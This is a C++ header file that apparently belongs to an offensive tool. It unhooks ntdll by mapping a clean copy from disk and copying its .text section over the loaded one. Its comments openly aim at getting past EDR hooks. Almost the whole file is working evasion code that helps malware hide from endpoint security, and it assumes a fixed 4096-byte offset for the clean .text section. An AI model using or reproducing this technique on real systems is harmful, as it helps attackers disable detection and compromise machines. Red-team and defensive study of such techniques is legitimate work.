#ifndef UNMAPPER_H_
#define UNMAPPER_H_

#include <Windows.h>
#include <iostream>
#include "Globals.h"

// Define a function that locates the base address of ntdll from disk

BOOL findCleanNtdll(_Out_ PVOID* ppCleanNtBase) {

	// Obtain a handle to ntdll -> not really focused on stealth at the moment
	HANDLE hNtdll = CreateFileA("C:\\Windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNtdll == INVALID_HANDLE_VALUE) {
		std::cout << "Failed to obtain handle to NTDLL: 0x" << std::hex << GetLastError() << std::endl;
		return FALSE;
	}
	// If we have obtained our handle, we need to create a file mapping
	HANDLE ntMapping = CreateFileMappingA(hNtdll, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL); // This call is hooked by the EDR via NtCreateSection
	if (ntMapping == NULL) {
		std::cout << "Failed to create file mapping: 0x" << std::hex << GetLastError() << std::endl;
		CloseHandle(hNtdll); // Close Handle if we fail to create file mapping
		return FALSE;
	}
	// If our mapping is created, let's call MapViewOfFile
	LPVOID ntMapView = MapViewOfFile(ntMapping, FILE_MAP_READ, 0, 0, 0); // Should be hooked by EDR
	if (ntMapView == NULL) {
		std::cout << "Failed to map view of NTDLL: 0x" << std::hex << GetLastError() << std::endl;
		CloseHandle(hNtdll);
		CloseHandle(ntMapping); // Close handles in case we fail to map view of file
		return FALSE;
	}

	std::cout << "Clean NTDLL Base Address: 0x" << std::hex << ntMapView << std::endl;
	*ppCleanNtBase = ntMapView;
	
	return TRUE;
}

// Function to locate .text section of clean ntdll image we identify from prev function
PBYTE findCleanTxt(VOID) {
// Let's attempt to overwrite ntdll base after we invoke the EDR
// Acquire PVOID to clean ntdll base addr

	PVOID pCleanNtdllBase = NULL;
	if (!findCleanNtdll(&pCleanNtdllBase)) {
		std::cout << "Error executing function to locate base address of unhooked DLL" << std::endl;
		return NULL;
	}
	if (pCleanNtdllBase == NULL) {
		std::cout << "Unhooked NTDLL Base Address is invalid!" << std::endl;
		return NULL;
	}

	// Calculate Address of Text Section
	PBYTE pCleanNtTxt = (PBYTE)pCleanNtdllBase + 4096;

	return pCleanNtTxt;
}

PVOID ntUnmapper(VOID){
	// Call function to find clean NTDLL text
	PBYTE pCleanNtTxt = findCleanTxt();
	if (pCleanNtTxt == NULL) {
		std::cout << "Error acquiring clean NTDLL Text Address" << std::endl;
		return NULL;
	}

	// Locate hooked ntdll base address
	/*
	/////////////IMAGE DOS HEADER///////////////
	*/
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)g_ntBase;
	// Sig Check
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		std::cerr << "Invalid DOS Signature!" << std::endl;
		return NULL;
	}

	/*
	/////////////IMAGE NT HEADER///////////////
	*/
	// NT HEADER = Base + DOS_HDR->e_lfanew
	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)g_ntBase + pImgDosHdr->e_lfanew);
	// Sig Check
	if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		std::cerr << "Invalid NT Signature!" << std::endl;
		return NULL;
	}

	/////////////IMAGE OPTIONAL HEADER///////////////
	PIMAGE_OPTIONAL_HEADER pImgOptHdr = &pImgNtHdr->OptionalHeader;
	// Added Capability to find g_ntBase .text section and size

	PVOID LocalNtTxt = NULL;
	ULONG LocalNtTxtSize = 0;

	PIMAGE_SECTION_HEADER pLocalNtClean = IMAGE_FIRST_SECTION(pImgNtHdr);
	for (DWORD i{ 0 }; i < pImgNtHdr->FileHeader.NumberOfSections; i++) {
		if (strcmp((char*)pLocalNtClean[i].Name, (char*)".text") == 0) {
			// if we identify the .text section, let's grab its ase address
			LocalNtTxt = (PVOID)((ULONG_PTR)g_ntBase + pLocalNtClean[i].VirtualAddress);
			LocalNtTxtSize = pLocalNtClean[i].Misc.VirtualSize;
			break;
		}
	}
	if (LocalNtTxt == NULL || LocalNtTxtSize == 0) {
		std::cout << "Error acquiring hooked NTDLL Text Address and Size" << std::endl;
		return NULL;
	}

	std::cout << "Hooked NTDLL Text Address: 0x" << std::hex << LocalNtTxt << std::endl;
	std::cout << "Hooked NTDLL Text Size in Bytes: " << LocalNtTxtSize << std::endl;
	// Assuming we have our hooked text section and size, we are ready to overwrite
	DWORD dwOldProtect = NULL;
	if (!VirtualProtect(LocalNtTxt, LocalNtTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) { // We can attempt to hook this and verify if address is *BaseAddress + 0x1000
		std::cout << "Virtual Protect failed with error: 0x" << std::hex << GetLastError() << std::endl;
		return NULL;
	}
	// perform copy assuming we updated perms successfully
	memcpy(LocalNtTxt, pCleanNtTxt, LocalNtTxtSize);

	std::cout << "NTDLL Unhooked Successfully!" << std::endl;
	// Restore previous permissions for hooked ntdll
	if (!VirtualProtect(LocalNtTxt, LocalNtTxtSize, dwOldProtect, &dwOldProtect)) {
		std::cout << "Could not restore memory permissions on Text section" << std::endl;
		return NULL;
	}
	std::cout << "Restored Memory Permissions on Text Section" << std::endl;

	return LocalNtTxt; // success
}
#endif // UNMAPPER_H_
